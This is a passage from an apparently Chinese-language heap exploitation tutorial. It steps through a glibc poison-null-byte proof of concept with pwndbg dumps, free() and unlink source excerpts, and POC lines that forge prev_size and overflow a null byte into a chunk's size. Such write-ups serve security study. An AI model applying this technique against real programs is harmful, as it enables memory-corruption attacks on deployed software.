<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br></pre></td></tr></table></figure>

<ul>
<li>chunksize(p)：获取 p 堆块的大小，不包含三个标志位。</li>
<li>prev_size(p)：获取 p 堆块的 mchunk_prev_size</li>
<li>next_chunk(p)：获取 p 堆块相邻高地址的堆块地址<blockquote>
<p>在 malloc 状态下返回的堆块指针指向堆块的起始地址</p>
</blockquote>
</li>
</ul>
<p>我们必须让 chunksize(P) == prev_size (next_chunk(P))才不会在后续的代码中触发异常，这个问题稍后再说；现在的内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a11</span> <span class="meta">#b(malloc)</span></span><br><span class="line">    								<span class="comment">//b_size_ptr指向此处</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>之后我们会将 b 堆块进行 free：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// this technique works by overwriting the size metadata of a free chunk</span></span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure>

<p>为了能看清楚，我们这里选择引入 free 源码进行调试；由于 b 堆块的大小为 0xa11，经过一些步骤之后会来到：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620024784560-671795f3-b479-4996-80a5-a693d01e79ce.png#clientId=ucb4443ff-3664-4&from=drop&id=u96f891f7&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-03%2014.53.00.png&originHeight=108&originWidth=2078&originalType=binary&size=32359&status=done&style=none&taskId=u289766e2-ae43-4a18-89f8-62e49175d04" alt="截屏2021-05-03 14.53.00.png"></p>
<blockquote>
<p>p==0x555555757760 //p 指向要释放堆块的堆块开头</p>
</blockquote>
<p>源码中的 prev_inuse(p)==((p)-&gt;mchunk_size &amp; PREV_INUSE)==0x1，因此不会进入 if 语句，这说明 p 之前的一个堆块是处于 malloc 状态，不会触发合并。</p>
<blockquote>
<p>这里的合并的分类有向前合并和向后合并，这两个概念稍后再说。</p>
</blockquote>
<p>由于现在要释放的堆块 p 的高地址相邻的堆块不为 top_chunk，因此会进入 if 语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>先来看一下第一行代码 inuse_bit_at_offset(nextchunk, nextsize)，其中 inuse_bit_at_offset 宏定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<p>很明显 inuse_bit_at_offset 是获取 p 堆块中 mchunk_size 标志位 PREV_INUSE 的值，运算结果为 nextinuse==0x1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//nextinuse=0x1,不会进入此if</span></span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>); <span class="comment">//清除nextchunk的PREV_INUSE标志位</span></span><br><span class="line"><span class="comment">//----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">//clear_inuse_bit_at_offset的宏定义如下</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757760</span></span><br><span class="line">Size: <span class="number">0xa11</span></span><br><span class="line">								<span class="comment">//清除标志位后：</span></span><br><span class="line">Allocated chunk | PREV_INUSE    <span class="comment">//Allocated chunk</span></span><br><span class="line">Addr: <span class="number">0x555555758170</span>			<span class="comment">//Addr: 0x555555758170</span></span><br><span class="line">Size: <span class="number">0x511</span>						<span class="comment">//Size: 0x510</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555758680</span></span><br><span class="line">Size: <span class="number">0x111</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555758790</span></span><br><span class="line">Size: <span class="number">0x1f871</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>清除 nextchunk 标志位之后说明 p 堆块开始进入释放状态，接下来开始将 p 堆块放入 top_chunk 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av); <span class="comment">//bck==0x7ffff7dcdca0 (main_arena+96)</span></span><br><span class="line">     fwd = bck-&gt;fd; <span class="comment">//fwd==0x00007ffff7dcdca0</span></span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) <span class="comment">//fwd-&gt;bk==0x00007ffff7dcdca0</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>); <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">     p-&gt;fd = fwd; <span class="comment">//设置p堆块的fd指针</span></span><br><span class="line">     p-&gt;bk = bck; <span class="comment">//设置p堆块的bk指针</span></span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size)) <span class="comment">//根据p堆块的大小按需设置fd_nextsize和bk_nextsize指针</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p; <span class="comment">//链入unsortedbin【1】</span></span><br><span class="line">     fwd-&gt;bk = p; <span class="comment">//链入unsortedbin【2】</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757760</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757760</span> <span class="comment">/* &#x27;`wuUUU&#x27; */</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line">pwndbg&gt; x/<span class="number">330</span>gx <span class="number">0x555555757760</span></span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a11</span> <span class="meta">#p(unsortedbin)</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#数据由POC伪造</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000510</span> <span class="meta">#nextchunk(malloc)</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"><span class="number">0x5555557581a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>最后设置 p 堆块的 head 和 foot：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br><span class="line"></span><br><span class="line">check_free_chunk(av, p); <span class="comment">//对free后堆块的检查</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">330</span>gx <span class="number">0x555555757760</span></span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a11</span> <span class="meta">#p(unsortedbin)</span></span><br><span class="line">    								#set_head(p, size | PREV_INUSE);</span><br><span class="line">    								#数据没有变化</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#数据由POC伪造</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#nextchunk(malloc)</span></span><br><span class="line">    			#set_foot(p, size)</span><br><span class="line"><span class="comment">//NULL......</span></span><br><span class="line"><span class="number">0x5555557581a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>最终返回，结束 free，此时的内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a11</span> <span class="meta">#b(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    								<span class="comment">//b_size_ptr指向此处</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#*(<span class="keyword">size_t</span>*)(b+<span class="number">0x9f0</span>) = <span class="number">0xa00</span>;</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>现在我们回到 POC 代码继续调试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0xa00 + 0x10) | prev_in_use\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; <span class="comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br></pre></td></tr></table></figure>

<p>如上面注释所说，假如现在有一个 off-by-one（单字节溢出）漏洞可以溢出到下一个堆块的 mchunk_size，也就是说现在的 b 堆块的大小被修改为 0xa00：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a00</span> <span class="meta">#b(free-unsortedbin)</span></span><br><span class="line">    								<span class="meta">#a[real_a_size] = 0</span></span><br><span class="line">    								#这里原来的数据为<span class="number">0xa11</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    								<span class="comment">//b_size_ptr指向此处</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			<span class="comment">//*(size_t*)(b+0x9f0) = 0xa00;</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>关于 0xa00 的修改有两个目的：</p>
<ul>
<li>堆块 a 被认为现在是处于“free”状态，因为 b 的 mchunk_size 中 PREV_INUSE 标志位为 0</li>
<li>堆块 b 现在的大小被修改为 0xa00，也就是说现在 b 堆块的可控范围从 0xa08 变为了 0x9F8：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改大小之前（处于malloc）：</span></span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a11</span> <span class="meta">#b---</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>     ｜</span><br><span class="line">......													   ｜--&gt;堆块b的可控范围：<span class="number">0xa08</span></span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	<span class="number">0x0000000000000000</span>     ｜<span class="comment">//0x8170-0x7770+0x8==0xa08</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000000</span>	------------------------</span><br><span class="line">                                    <span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line"><span class="meta">#pwndbg&gt; p/t 0x0000000000000a11</span></span><br><span class="line">#$<span class="number">33</span> = <span class="number">101000010001</span></span><br><span class="line"><span class="meta">#pwndbg&gt;</span></span><br><span class="line">---------------------------------------------------------</span><br><span class="line"><span class="comment">//修改大小之后（处于malloc）：</span></span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000a00</span> <span class="meta">#b---</span></span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>     ｜</span><br><span class="line">......													   ｜--&gt;堆块b的可控范围：<span class="number">0x9F8</span></span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000a00</span>	------------------------ <span class="comment">//0x8160-0x7770+0x8==0x9F8</span></span><br><span class="line">    								<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line"><span class="meta">#pwndbg&gt; p/t 0x0000000000000a00</span></span><br><span class="line">#$<span class="number">34</span> = <span class="number">101000000000</span></span><br><span class="line"><span class="meta">#pwndbg&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的堆块可控范围指的是堆块中user_data的大小</span></span><br></pre></td></tr></table></figure>

<p>接下来执行下面的代码，这两行代码没有实际作用，主要是为了查看堆块 c 的 mchunk_prev_size 方便</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="keyword">uint64_t</span>*)c)<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">				<span class="comment">//*c_prev_size_ptr==0xa10</span></span><br><span class="line">......</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>接下来来到一个比较重点的地方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0xa00 == b+0x9f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">	*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line">	<span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line">	<span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br></pre></td></tr></table></figure>

<p>我们先来看一下 POC 中的注释：“接下来的 malloc 将会在调用时触发 unlink，但是为了 POC 的正常执行我们必须绕过 unlink 中的检查”，我们这里再复习一下 unlink 宏中的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))  <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize 